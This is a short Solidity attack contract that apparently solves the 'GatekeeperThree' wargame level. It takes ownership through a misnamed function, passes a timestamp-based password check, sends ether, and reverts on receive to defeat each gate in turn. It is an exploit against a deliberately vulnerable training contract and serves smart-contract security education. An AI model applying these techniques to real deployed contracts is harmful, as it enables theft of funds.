// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract Attack
{
    GatekeeperThree target;

    constructor (address payable _target) payable
    {
        require(msg.value == 0.002 ether);
        target = GatekeeperThree(_target);
    }

    function letsAGo() public
    {
        //make yourself the owner to pass gate1
        target.construct0r();

        // create trick & get allowance for gate2
        target.createTrick();
        target.getAllowance(block.timestamp);

        //send some money to pass gate3
        address(target).call{value: 0.002 ether}("");

        //call the enter function
        target.enter();
    }

    receive() external payable
    {
        //revert so .send() returns false
        revert();
    }
}